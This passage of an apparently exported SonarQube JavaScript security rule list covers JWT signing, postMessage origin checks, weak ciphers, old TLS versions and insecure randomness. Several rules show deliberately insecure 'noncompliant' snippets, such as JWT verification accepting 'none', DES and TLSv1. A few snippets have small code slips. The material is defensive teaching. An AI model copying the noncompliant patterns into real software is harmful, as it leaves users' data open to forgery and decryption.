    algorithms: [&#39;none&#39;] // Noncompliant
}, callbackcheck);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.sign(payload, key, { algorithm: &#39;HS256&#39; });
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: [&#39;HS256&#39;]
}, callbackcheck);
</pre>
<h3>How does this work?</h3>
<h4>Always sign your tokens</h4>
<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can
tamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a
signing function, and using it is usually as simple as providing a secret key when the token is created.</p>
<h4>Choose a strong cipher algorithm</h4>
<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are
considered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),
which uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be
able to forge tokens.</p>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue follow these instructions:</p>
<ol><li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li><li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take on encountering an invalid token should be denying the request carrying it and logging the event for further
  investigation. </li><li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li></ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2819">
              javascript:S2819
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Browsers <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="nofollow">allow message exchanges</a> between Window objects of
different origins.</p>
<p>Because any window can send or receive messages from another window, it is important to verify the sender’s/receiver’s identity:</p>
<ul><li> When sending a message with the postMessage method, the identity’s receiver should be defined (the wildcard keyword (<code>*</code>) should not
  be used). </li><li> When receiving a message with a message event, the sender’s identity should be verified using the origin and possibly source properties. </li></ul>
<h3>Noncompliant code example</h3>
<p>When sending a message:</p>
<pre>
var iframe &#61; document.getElementById(&#34;testiframe&#34;);
iframe.contentWindow.postMessage(&#34;secret&#34;, &#34;*&#34;); // Noncompliant: * is used
</pre>
<p>When receiving a message:</p>
<pre>
window.addEventListener(&#34;message&#34;, function(event) { // Noncompliant: no checks are done on the origin property.
      console.log(event.data);
 });
</pre>
<h3>Compliant solution</h3>
<p>When sending a message:</p>
<pre>
var iframe &#61; document.getElementById(&#34;testsecureiframe&#34;);
iframe.contentWindow.postMessage(&#34;hello&#34;, &#34;https://secure.example.com&#34;); // Compliant
</pre>
<p>When receiving a message:</p>
<pre>
window.addEventListener(&#34;message&#34;, function(event) {

  if (event.origin !&#61;&#61; &#34;http://example.org&#34;) // Compliant
    return;

  console.log(event.data)
});
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="nofollow">developer.mozilla.org</a> - postMessage API </li><li> <a href="https://cwe.mitre.org/data/definitions/345.html" rel="nofollow">MITRE, CWE-345</a> - Insufficient Verification of Data Authenticity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5547">
              javascript:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;DES&#34;, key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;AES-256-GCM&#34;, key, iv);
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5542">
              javascript:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;AES-128-CBC&#34;, key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;AES-256-GCM&#34;, key, iv);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4787">
              javascript:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS4426&amp;rule_key&#61;javascript%3AS4426" rel="nofollow">S4426</a>, <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS5542&amp;rule_key&#61;javascript%3AS5542" rel="nofollow">S5542</a>, <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS5547&amp;rule_key&#61;javascript%3AS5547" rel="nofollow">S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7902" rel="nofollow">CVE-2017-7902</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-1378" rel="nofollow">CVE-2006-1378</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2003-1376" rel="nofollow">CVE-2003-1376</a> </li></ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the private key might not be random, strong enough or the same key is reused for a long long time. </li><li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li><li> the key exchange is made without properly authenticating the receiver. </li><li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li><li> the chosen encryption library is deemed unsafe. </li><li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li><li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li><li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li><li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Generate encryption keys using secure random algorithms. </li><li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li><li> Regenerate the keys regularly. </li><li> Always store the keys in a safe location and transfer them only over safe channels. </li><li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li><li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li><li> When a nonce is used, generate it randomly every time. </li><li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li><li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like &#34;Chosen-Plaintext Attacks&#34;. Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li><li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul><li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li><li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; Client side &#61;&#61;&#61;
crypto.subtle.encrypt(algo, key, plainData); // Sensitive
crypto.subtle.decrypt(algo, key, encData); // Sensitive
</pre>
<pre>
// &#61;&#61;&#61; Server side &#61;&#61;&#61;
const crypto &#61; require(&#34;crypto&#34;);
const cipher &#61; crypto.createCipher(algo, key); // Sensitive
const cipheriv &#61; crypto.createCipheriv(algo, key, iv); // Sensitive
const decipher &#61; crypto.createDecipher(algo, key); // Sensitive
const decipheriv &#61; crypto.createDecipheriv(algo, key, iv); // Sensitive
const pubEnc &#61; crypto.publicEncrypt(key, buf); // Sensitive
const privDec &#61; crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Sensitive
const privEnc &#61; crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Sensitive
const pubDec &#61; crypto.publicDecrypt(key, privEnc); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/321" rel="nofollow">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li><li> <a href="https://cwe.mitre.org/data/definitions/322" rel="nofollow">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/323" rel="nofollow">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li><li> <a href="https://cwe.mitre.org/data/definitions/324" rel="nofollow">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li><li> <a href="https://cwe.mitre.org/data/definitions/325" rel="nofollow">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4423">
              javascript:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>NodeJs offers multiple ways to set weak TLS protocols. For https and tls, <a href="https://nodejs.org/api/tls.html#tlscreatesecurecontextoptions" rel="nofollow">these options</a> are used and are used in other third-party libraries as
well.</p>
<p>The first is <code>secureProtocol</code>:</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
 secureProtocol: &#39;TLSv1_method&#39; // Noncompliant
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<p>The second is the combination of <code>minVersion</code> and <code>maxVerison</code>. Note that they cannot be specified along with the
<code>secureProtocol</code> option:</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  minVersion: &#39;TLSv1.1&#39;,  // Noncompliant
  maxVersion: &#39;TLSv1.2&#39;
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<p>And <code>secureOptions</code>, which in this example instructs the OpenSSL protocol to turn off some algorithms altogether. In general, this
option might trigger side effects and should be used carefully, if used at all.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
const https     &#61; require(&#39;node:https&#39;);
const tls       &#61; require(&#39;node:tls&#39;);
const constants &#61; require(&#39;node:crypto&#39;):

let options &#61; {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
}; // Noncompliant

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  minVersion: &#39;TLSv1.2&#39;,
  maxVersion: &#39;TLSv1.2&#39;
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<p>Here, the goal is to turn on only TLSv1.2 and higher, by turning off all lower versions:</p>
<pre data-diff-id="13" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
    | constants.SSL_OP_NO_TLSv1_1
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2245">
              javascript:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical
applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used
instead.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
const val &#61; Math.random(); // Sensitive
// Check if val is used in a security context.
</pre>
<h2>Compliant Solution</h2>
<pre>
// &#61;&#61;&#61; Client side &#61;&#61;&#61;
const crypto &#61; window.crypto || window.msCrypto;
var array &#61; new Uint32Array(1);
crypto.getRandomValues(array); // Compliant for security-sensitive use cases

// &#61;&#61;&#61; Server side &#61;&#61;&#61;
const crypto &#61; require(&#39;crypto&#39;);
const buf &#61; crypto.randomBytes(1); // Compliant for security-sensitive use cases
</pre>
<h2>See</h2>
